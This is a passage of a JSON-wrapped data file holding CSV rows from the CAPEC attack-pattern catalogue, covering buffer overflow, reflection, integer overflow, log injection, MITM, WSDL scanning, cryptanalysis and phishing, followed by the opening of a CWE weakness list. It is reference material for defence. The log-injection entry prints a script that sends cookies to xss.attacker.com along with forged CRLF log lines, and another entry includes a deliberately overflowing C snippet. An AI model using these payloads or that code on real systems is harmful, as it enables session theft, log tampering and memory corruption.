specialized resources are required to execute this type of attack. Having knowledge of the way the target site has been structured, in order to create a fake version, is required. Poisoning the resolver requires knowledge of a vulnerability that can be exploited.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::All sensitive information must be handled over a secure connection.::Known vulnerabilities in DNS or router software or in operating systems must be patched as soon as a fix has been released and tested.::End users must ensure that they provide sensitive information only to websites that they trust, over a secure connection with a valid certificate issued by a well-known certificate authority.::\",\"::An online bank website requires users to provide their customer ID and password to log on, but does not use a secure connection. An attacker can setup a similar fake site and leverage pharming to collect this information from unknowing victims.::\",\"::346::350::\",\"\",\"\",\n9,\"Buffer Overflow in Local Command-Line Utilities\",Detailed,Draft,\"This attack targets command-line utilities available in a number of shells. An adversary can leverage a vulnerability found in a command-line utility to escalate privilege to root.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:100::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target system] The adversary first finds a target system that they want to gain elevated priveleges on. This could be a system they already have some level of access to or a system that they will gain unauthorized access at a lower privelege using some other means.::STEP:2:PHASE:Explore:DESCRIPTION:[Find injection vector] The adversary identifies command line utilities exposed by the target host that contain buffer overflow vulnerabilites. The adversary likely knows which utilities have these vulnerabilities and what the effected versions are, so they will also obtain version numbers for these utilities.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow command] Once the adversary has found a vulnerable utility, they will use their knownledge of the vulnerabilty to create the command that will exploit the buffer overflow.::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary executes the crafted command, gaining elevated priveleges on the machine.::\",\"::The target host exposes a command-line utility to the user.::The command-line utility exposed by the target host has a buffer overflow vulnerability that can be exploited.::\",\"::SKILL:An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as buffer overflow.::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Operational: Use OS-level preventative functionality. Not a complete solution.::Apply the latest patches to your user exposed services. This may not be a complete solution, especially against a zero day attack.::Do not unnecessarily expose services.::\",\"::Attack Example: HPUX passwd A buffer overflow in the HPUX passwd command allows local users to gain root privileges via a command-line option. Attack Example: Solaris getopt A buffer overflow in Solaris's getopt command (found in libc) allows local users to gain root privileges via a long argv[0].::\",\"::120::118::119::74::20::680::733::697::\",\"\",\"\",\n90,\"Reflection Attack in Authentication Protocol\",Standard,Draft,\"An adversary can abuse an authentication protocol susceptible to reflection attack in order to defeat it. Doing so allows the adversary illegitimate access to the target system, without possessing the requisite credentials. Reflection attacks are of great concern to authentication protocols that rely on a challenge-handshake or similar mechanism. An adversary can impersonate a legitimate user and can gain illegitimate access to the system by successfully mounting a reflection attack during authentication.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:272::NATURE:ChildOf:CAPEC ID:114::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify service with vulnerable handshake authentication] The adversary must first identify a vulnerable authentication protocol. The most common indication of an authentication protocol vulnerable to reflection attack is when the client initiates the handshake, rather than the server. This allows the client to get the server to encrypt targeted data using the server's pre-shared key.::STEP:2:PHASE:Experiment:DESCRIPTION:[Send challenge to target server] The adversary opens a connection to the target server and sends it a challenge. This challenge is arbitrary and is simply used as a placeholder for the protocol in order to get the server to respond.::STEP:3:PHASE:Experiment:DESCRIPTION:[Receive server challenge] The server responds by returning the challenge sent encrypted with the server's pre-shared key, as well as its own challenge to the attacker sent in plaintext. We will call this challenge sent by the server C. C is very important and is stored off by the adversary for the next step.::STEP:4:PHASE:Experiment:DESCRIPTION:[Initiate second handshake] Since the adversary does not possess the pre-shared key, they cannot encrypt C from the previous step in order for the server to authenticate them. To get around this, the adversary initiates a second connection to the server while still keeping the first connection alive. In the second connection, the adversary sends C as the initial client challenge, which rather than being arbitary like the first connection, is very intentional.::STEP:5:PHASE:Experiment:DESCRIPTION:[Receive encrypted challenge] The server treats the intial client challenge in connection two as an arbitrary client challenge and responds by encrypting C with the pre-shared key. The server also sends a new challenge. The adversary ignores the server challenge and stores the encrypted version of C. The second connection is either terminated or left to expire by the adversary as it is no longer needed.::STEP:6:PHASE:Exploit:DESCRIPTION:The adversary now posseses the encrypted version of C that is obtained through connection two. The adversary continues the handshake in connection one by responding to the server with the encrypted version of C, verifying that they have access to the pre-shared key (when they actually do not). Because the server uses the same pre-shared key for all authentication it will decrypt C and authenticate the adversary for the first connection, giving the adversary illegitimate access to the target system.::\",\"::The attacker must have direct access to the target server in order to successfully mount a reflection attack. An intermediate entity, such as a router or proxy, that handles these exchanges on behalf of the attacker inhibits the attackers' ability to attack the authentication protocol.::\",\"::SKILL:The attacker needs to have knowledge of observing the protocol exchange and managing the required connections in order to issue and respond to challenges:LEVEL:Medium::\",\"::All that the attacker requires is a means to observe and understand the protocol exchanges in order to reflect the challenges appropriately.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::The server must initiate the handshake by issuing the challenge. This ensures that the client has to respond before the exchange can move any further::The use of HMAC to hash the response from the server can also be used to thwart reflection. The server responds by returning its own challenge as well as hashing the client's challenge, its own challenge and the pre-shared secret. Requiring the client to respond with the HMAC of the two challenges ensures that only the possessor of a valid pre-shared secret can successfully hash in the two values.::Introducing a random nonce with each new connection ensures that the attacker cannot employ two connections to attack the authentication protocol::\",\"::A single sign-on solution for a network uses a fixed pre-shared key with its clients to initiate the sign-on process in order to avoid eavesdropping on the initial exchanges. An attacker can use a reflection attack to mimic a trusted client on the network to participate in the sign-on exchange.::\",\"::301::303::\",\"\",\"\",\n92,\"Forced Integer Overflow\",Detailed,Draft,\"This attack forces an integer variable to go out of range. The integer variable is often used as an offset such as size of memory allocation or similarly. The attacker would typically control the value of such variable and try to get it out of range. For instance the integer in question is incremented past the maximum possible value, it may wrap to become a very small, or negative number, therefore providing a very incorrect value which can lead to unexpected behavior. At worst the attacker can execute arbitrary code.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:128::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The first step is exploratory meaning the attacker looks for an integer variable that they can control.::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker finds an integer variable that they can write into or manipulate and try to get the value of the integer out of the possible range.::STEP:3:PHASE:Exploit:DESCRIPTION:The integer variable is forced to have a value out of range which set its final value to an unexpected value.::STEP:4:PHASE:Exploit:DESCRIPTION:The target host acts on the data and unexpected behavior may happen.::\",\"::The attacker can manipulate the value of an integer variable utilized by the target host.::The target host does not do proper range checking on the variable before utilizing it.::When the integer variable is incremented or decremented to an out of range value, it gets a very different value (e.g. very small or negative number)::\",\"::SKILL:An attacker can simply overflow an integer by inserting an out of range value.:LEVEL:Low::SKILL:Exploiting a buffer overflow by injecting malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Use a language or compiler that performs automatic bounds checking.::Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as integer overflow.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Always do bound checking before consuming user input data.::\",\"::Integer overflow in the ProcAuWriteElement function in server/dia/audispatch.c in Network Audio System (NAS) before 1.8a SVN 237 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large max_samples value. See also: CVE-2007-1544::The following code illustrates an integer overflow. The declaration of total integer as unsigned short int assumes that the length of the first and second arguments fits in such an integer [REF-547], [REF-548]. include <stdlib.h>include <string.h>include <stdio.h> int main (int argc, char *const *argv){if (argc !=3){printf(Usage: prog_name <string1> <string2>n);exit(-1); }unsigned short int total;total = strlen(argv[1])+strlen(argv[2])+1;char * buff = (char *)malloc(total);strcpy(buff, argv[1]);strcpy(buff, argv[2]); }::\",\"::190::128::120::122::196::680::697::\",\"TAXONOMY NAME:WASC:ENTRY ID:03:ENTRY NAME:Integer Overflows::\",\"\",\n93,\"Log Injection-Tampering-Forging\",Detailed,Draft,\"This attack targets the log files of the target host. The attacker injects, manipulates or forges malicious log entries in the log file, allowing them to mislead a log audit, cover traces of attack, or perform other malicious actions. The target host is not properly controlling log access. As a result tainted data is resulting in the log files leading to a failure in accountability, non-repudiation and incident forensics capability.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:268::NATURE:CanPrecede:CAPEC ID:592::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Application's Log File Format] The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system.:TECHNIQUE:Determine logging utility being used by application (e.g. log4j):TECHNIQUE:Gain access to application's source code to determine log file formats.:TECHNIQUE:Install or obtain access to instance of application and observe its log file format.::STEP:2:PHASE:Exploit:DESCRIPTION:[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.:TECHNIQUE:Use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example: %0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in may add the following forged entry into a log file: [Thu Nov 12 12:11:22]:Info: User admin logged in Different applications may require different encodings of the carriage return and line feed characters.:TECHNIQUE:Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain <script>new Image().src=http://xss.attacker.com/log_cookie?cookie=+encodeURI(document.cookie);</script> The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).::\",\"::The target host is logging the action and data of the user.::The target host insufficiently protects access to the logs or logging mechanisms.::\",\"::SKILL:This attack can be as simple as adding extra characters to the logged data (e.g. username). Adding entries is typically easier than removing entries.:LEVEL:Low::SKILL:A more sophisticated attack can try to defeat the input validation mechanism.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Carefully control access to physical log files.::Do not allow tainted data to be written in the log file without prior input validation. An allowlist may be used to properly validate the data.::Use synchronization to control the flow of execution.::Use static analysis tools to identify log forging vulnerabilities.::Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.::\",\"::Dave Nielsen and Patrick Breitenbach PayPal Web Services (aka PHP Toolkit) 0.50, and possibly earlier versions, allows remote attackers to enter false payment entries into the log file via HTTP POST requests to ipn_success.php. See also: CVE-2006-0201::If a user submits the string twenty-one for val, the following entry is logged: INFO: Failed to parse val=twenty-one However, if an attacker submits the string twenty-one%0a%0aINFO:+User+logged+out%3dbadguy the following entry is logged: INFO: Failed to parse val=twenty-oneINFO: User logged out=badguy Clearly, attackers can use this same mechanism to insert arbitrary log entries.::\",\"::117::75::150::\",\"\",\"\",\n94,\"Adversary in the Middle (AiTM)\",Meta,Stable,\"An adversary targets the communication between two components (typically client and server), in order to alter or obtain data from transactions. A general approach entails the adversary placing themself within the communication channel between the two components.\",\"::TERM:Man-in-the-Middle / MITM:DESCRIPTION:::TERM:Person-in-the-Middle / PiTM:DESCRIPTION:::TERM:Monkey-in-the-Middle:DESCRIPTION:::TERM:Monster-in-the-Middle:DESCRIPTION:::TERM:On-path Attacker:DESCRIPTION:::\",High,Very High,\"::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:668::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Communication Mechanism] The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit.:TECHNIQUE:Perform a sniffing attack and observe communication to determine a communication protocol.:TECHNIQUE:Look for application documentation that might describe a communication mechanism used by a target.::STEP:2:PHASE:Experiment:DESCRIPTION:[Position In Between Targets] The adversary inserts themself into the communication channel initially acting as a routing proxy between the two targeted components.:TECHNIQUE:Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client.:TECHNIQUE:Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL.::STEP:3:PHASE:Exploit:DESCRIPTION:[Use Intercepted Data Maliciously] The adversary observes, filters, or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for their own purposes.:TECHNIQUE:Prevent some messages from reaching their destination, causing a denial of service.::\",\"::There are two components communicating with each other.::An attacker is able to identify the nature and mechanism of communication between the two target components.::An attacker can eavesdrop on the communication between the target components.::Strong mutual authentication is not used between the two target components yielding opportunity for attacker interposition.::The communication occurs in clear (not encrypted) or with insufficient and spoofable encryption.::\",\"::SKILL:This attack can get sophisticated since the attack may use cryptography.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Ensure Public Keys are signed by a Certificate Authority::Encrypt communications using cryptography (e.g., SSL/TLS)::Use Strong mutual authentication to always fully authenticate both ends of any communications channel.::Exchange public keys using a secure channel::\",\"::In 2017, security researcher Jerry Decime discovered that Equifax mobile applications were not leveraging HTTPS in all areas. Although authentication was properly utilizing HTTPS, in addition to validating the root of trust of the server certificate, other areas of the application were using HTTP to communicate. Adversaries could then conduct MITM attacks on rogue WiFi or cellular networks and hijack the UX. This further allowed the adversaries to prompt users for sensitive data, which could then be obtained in the plaintext response. [REF-636]::\",\"::300::290::593::287::294::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1557:ENTRY NAME:Adversary-in-the-Middle::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Man-in-the-middle attack::\",\"\",\n95,\"WSDL Scanning\",Detailed,Draft,\"This attack targets the WSDL interface made available by a web service. The attacker may scan the WSDL interface to reveal sensitive information about invocation patterns, underlying technology implementations and associated vulnerabilities. This type of probing is carried out to perform more serious attacks (e.g. parameter tampering, malicious content injection, command injection, etc.). WSDL files provide detailed information about the services ports and bindings available to consumers. For instance, the attacker can submit special characters or malicious content to the Web service and can cause a denial of service condition or illegal access to database records. In addition, the attacker may try to guess other private methods by using the information provided in the WSDL files.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:54::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Scan for WSDL Documents] The adversary scans for WSDL documents. The WDSL document written in XML is like a handbook on how to communicate with the web services provided by the target host. It provides an open view of the application (function details, purpose, functional break down, entry points, message types, etc.). This is very useful information for the adversary.::STEP:2:PHASE:Experiment:DESCRIPTION:[Analyze WSDL files] An adversary will analyze the WSDL files and try to find potential weaknesses by sending messages matching the pattern described in the WSDL file. The adversary could run through all of the operations with different message request patterns until a breach is identified.::STEP:3:PHASE:Exploit:DESCRIPTION:[Craft malicious content] Once an adversary finds a potential weakness, they can craft malicious content to be sent to the system. For instance the adversary may try to submit special characters and observe how the system reacts to an invalid request. The message sent by the adversary may not be XML validated and cause unexpected behavior.::\",\"::A client program connecting to a web service can read the WSDL to determine what functions are available on the server.::The target host exposes vulnerable functions within its WSDL interface.::\",\"::SKILL:This attack can be as simple as reading WSDL and starting sending invalid request.:LEVEL:Low::SKILL:This attack can be used to perform more sophisticated attacks (SQL injection, etc.):LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::It is important to protect WSDL file or provide limited access to it.::Review the functions exposed by the WSDL interface (especially if you have used a tool to generate it). Make sure that none of them is vulnerable to injection.::Ensure the WSDL does not expose functions and APIs that were not intended to be exposed.::Pay attention to the function naming convention (within the WSDL interface). Easy to guess function name may be an entry point for attack.::Validate the received messages against the WSDL Schema. Incomplete solution.::\",\"::A WSDL interface may expose a function vulnerable to SQL Injection.::The Web Services Description Language (WSDL) allows a web service to advertise its capabilities by describing operations and parameters needed to access the service. As discussed in step 5 of this series, WSDL is often generated automatically, using utilities such as Java2WSDL, which takes a class or interface and builds a WSDL file in which interface methods are exposed as web services. Because WSDL generation often is automated, enterprising adversaries can use WSDL to gain insight into the both public and private services. For example, an organization converting legacy application functionality to a web services framework may inadvertently pass interfaces not intended for public consumption to a WSDL generation tool. The result will be SOAP interfaces that give access to private methods. Another, more subtle WSDL attack occurs when an enterprising attacker uses naming conventions to guess the names of unpublished methods that may be available on the server. For example, a service that offers a stock quote and trading service may publish query methods such as requestStockQuote in its WSDL. However, similar unpublished methods may be available on the server but not listed in the WSDL, such as executeStockQuote. A persistent adversary with time and a library of words and phrases can cycle thru common naming conventions (get, set, update, modify, and so on) to discover unpublished application programming interfaces that open doors into private data and functionality. Source : Seven Steps to XML Mastery, Step 7: Ensure XML Security, Frank Coyle. See reference section.::\",\"::538::\",\"\",\"\",\n96,\"Block Access to Libraries\",Detailed,Draft,\"An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. It is possible that the application does not handle situations properly where access to these libraries has been blocked. Depending on the error handling within the application, blocked access to libraries may leave the system in an insecure state that could be leveraged by an attacker.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:603::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:Determine what external libraries the application accesses.::STEP:2:PHASE:Experiment:DESCRIPTION:Block access to the external libraries accessed by the application.::STEP:3:PHASE:Experiment:DESCRIPTION:Monitor the behavior of the system to see if it goes into an insecure/inconsistent state.::STEP:4:PHASE:Experiment:DESCRIPTION:If the system does go into an insecure/inconsistent state, leverage that to obtain information about the system functionality or data, elevate access control, etc. The rest of this attack will depend on the context and the desired goal.::\",\"::An application requires access to external libraries.::An attacker has the privileges to block application access to external libraries.::\",\"::SKILL:Knowledge of how to block access to libraries, as well as knowledge of how to leverage the resulting state of the application based on the failed call.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Alter Execution Logic::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Ensure that application handles situations where access to APIs in external libraries is not available securely. If the application cannot continue its execution safely it should fail in a consistent and secure fashion.::\",\"::A web-based system uses a third party cryptographic random number generation library that derives entropy from machine's hardware. This library is used in generation of user session ids used by the application. If the library is inaccessible, the application instead uses a software based weak pseudo random number generation library. An attacker of the system blocks access of the application to the third party cryptographic random number generation library (by renaming it). The application in turn uses the weak pseudo random number generation library to generate session ids that are predictable. An attacker then leverages this weakness to guess a session id of another user to perform a horizontal elevation of privilege escalation and gain access to another user's account.::\",\"::589::\",\"\",\"\",\n97,\"Cryptanalysis\",Standard,Draft,\"Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction). Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful. An attacker may have other goals as well, such as: Total Break (finding the secret key), Global Deduction (finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key), Information Deduction (gaining some information about plaintexts or ciphertexts that was not previously known) and Distinguishing Algorithm (the attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bits).\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:192::NATURE:CanPrecede:CAPEC ID:20::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:An attacker discovers a weakness in the cryptographic algorithm or a weakness in how it was applied to a particular chunk of plaintext.::STEP:2:PHASE:Exploit:DESCRIPTION:An attacker leverages the discovered weakness to decrypt, partially decrypt or infer some information about the contents of the encrypted message. All of that is done without knowing the secret key.::\",\"::The target software utilizes some sort of cryptographic algorithm.::An underlying weaknesses exists either in the cryptographic algorithm used or in the way that it was applied to a particular chunk of plaintext.::The encryption algorithm is known to the attacker.::An attacker has access to the ciphertext.::\",\"::SKILL:Cryptanalysis generally requires a very significant level of understanding of mathematics and computation.:LEVEL:High::\",\"::Computing resource requirements will vary based on the complexity of a given cryptanalysis technique. Access to the encryption/decryption routines of the algorithm is also required.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:In most cases, if cryptanalysis is successful at all, an adversary will not be able to decrypt the entire message, but instead will only be able to deduce some information about the plaintext. However, that may be sufficient for an adversary, depending on the context of the attack.::\",\"::Use proven cryptographic algorithms with recommended key sizes.::Ensure that the algorithms are used properly. That means: 1. Not rolling out your own crypto; Use proven algorithms and implementations. 2. Choosing initialization vectors with sufficiently random numbers 3. Generating key material using good sources of randomness and avoiding known weak keys 4. Using proven protocols and their implementations. 5. Picking the most appropriate cryptographic algorithm for your usage context and data::\",\"::A very easy to understand example is a cryptanalysis technique called frequency analysis that can be successfully applied to the very basic classic encryption algorithms that performed mono-alphabetic substitution replacing each letter in the plaintext with its predetermined mapping letter from the same alphabet. This was considered an improvement over a more basic technique that would simply shift all of the letters of the plaintext by some constant number of positions and replace the original letters with the new letter with the resultant alphabet position. While mono-alphabetic substitution ciphers are resilient to blind brute force, they can be broken easily with nothing more than a pen and paper. Frequency analysis uses the fact that natural language is not random and mono-alphabetic substitution does not hide the statistical properties of the natural language. So if the letter E in an English language occurs with a certain known frequency (about 12.7%), whatever E was substituted with to get to the ciphertext, will occur with the similar frequency. Having this frequency information allows the cryptanalyst to quickly determine the substitutions and decipher the ciphertext. Frequency analysis techniques are not applicable to modern ciphers as they are all resilient to it (unless this is a very bad case of a homegrown encryption algorithm). This example is inapplicable to modern cryptographic ciphers but is here to illustrate a rudimentary example of cryptanalysis.::\",\"::327::1204::1240::1241::1279::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Cryptanalysis::\",\"\",\n98,\"Phishing\",Standard,Draft,\"Phishing is a social engineering technique where an attacker masquerades as a legitimate entity with which the victim might do business in order to prompt the user to reveal some confidential information (very frequently authentication credentials) that can later be used by an attacker. Phishing is essentially a form of information gathering or fishing for information.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanPrecede:CAPEC ID:543::NATURE:CanPrecede:CAPEC ID:611::NATURE:CanPrecede:CAPEC ID:630::NATURE:CanPrecede:CAPEC ID:631::NATURE:CanPrecede:CAPEC ID:632::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.:TECHNIQUE:Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L):TECHNIQUE:Optionally obtain a legitimate SSL certificate for the new domain name.::STEP:2:PHASE:Explore:DESCRIPTION:[Explore legitimate website and create duplicate] An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.:TECHNIQUE:Use spidering software to get copy of web pages on legitimate site.:TECHNIQUE:Manually save copies of required web pages from legitimate site.:TECHNIQUE:Create new web pages that have the legitimate site's look and feel, but contain completely new content.::STEP:3:PHASE:Exploit:DESCRIPTION:[Convince user to enter sensitive information on attacker's site.] An attacker sends an e-mail to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the e-mail is coming from a legitimate entity with which the victim does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.:TECHNIQUE:Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.:TECHNIQUE:Place phishing link in post to online forum.::STEP:4:PHASE:Exploit:DESCRIPTION:[Use stolen credentials to log into legitimate site] Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.:TECHNIQUE:Log in to the legitimate site using another user's supplied credentials::\",\"::An attacker needs to have a way to initiate contact with the victim. Typically that will happen through e-mail.::An attacker needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their hooks to many potential victims.::An attacker needs to have a sufficiently compelling call to action to prompt the user to take action.::The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity.::\",\"::SKILL:Basic knowledge about websites: obtaining them, designing and implementing them, etc.:LEVEL:Medium::\",\"::Some web development tools to put up a fake website.::\",\"::You receive an e-mail from an entity that you are not even a customer of prompting you to log into your account.::You receive any e-mail that provides you with a link which takes you to a website on which you need to enter your log in information.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind.::\",\"::The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An attacker has just collected the target's online banking information which can now be used by the attacker to log into the target's bank account and transfer money to a bank account of the attackers' choice.::An adversary may use BlueJacking, or Bluetooth Phishing to send unsolicited contact cards, messages, or pictures to nearby devices that are listening via Bluetooth. These messages may contain phishing content.::\",\"::451::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1566:ENTRY NAME:Phishing::::TAXONOMY NAME:ATTACK:ENTRY ID:1598:ENTRY NAME:Phishing for Information::\",\"\","
  },
  "doc-47fb3c7463b38bb2469b00de2ad473ed": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n5,\"J2EE Misconfiguration: Data Transmission Without Encryption\",Variant,Draft,\"Information sent over a network can be compromised while in transit. An attacker may be able to read or modify the contents if the data are sent in plaintext or are weakly encrypted.\",\"\",::NATURE:ChildOf:CWE ID:319:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::SCOPE:Integrity:IMPACT:Modify Application Data::\",\"\",\"::PHASE:System Configuration:DESCRIPTION:The product configuration should ensure that SSL or an encryption mechanism of equivalent strength and vetted reputation is used for all access-controlled pages.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:J2EE Misconfiguration: Insecure Transport::\",,\"::TYPE:Other:NOTE:If an application uses SSL to guarantee confidential communication with client browsers, the application configuration should make it impossible to view any access controlled page without SSL. There are three common ways for SSL to be bypassed: A user manually enters URL and types HTTP rather than HTTPS. Attackers intentionally send a user to an insecure URL. A programmer erroneously creates a relative link to a page in the application, which does not switch from HTTP to HTTPS. (This is particularly easy to do when the link moves between public and secured areas on a web site.)::\",\n6,\"J2EE Misconfiguration: Insufficient Session-ID Length\",Variant,Incomplete,\"The J2EE application is configured to use an insufficient session ID length.\",\"If an attacker can guess or steal a session ID, then they may be able to take over the user's session (called session hijacking). The number of possible session IDs increases with increased session ID length, making it more difficult to guess or steal a session ID.\",::NATURE:ChildOf:CWE ID:334:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"::Session ID's can be used to identify communicating parties in a web environment. The expected number of seconds required to guess a valid session identifier is given by the equation: (2^B+1)/(2*A*S) Where: - B is the number of bits of entropy in the session identifier. - A is the number of guesses an attacker can try each second. - S is the number of valid session identifiers that are valid and available to be guessed at any given time. The number of bits of entropy in the session identifier is always less than the total number of bits in the session identifier. For example, if session identifiers were provided in ascending order, there would be close to zero bits of entropy in the session identifier no matter the identifier's length. Assuming that the session identifiers are being generated using a good source of random numbers, we 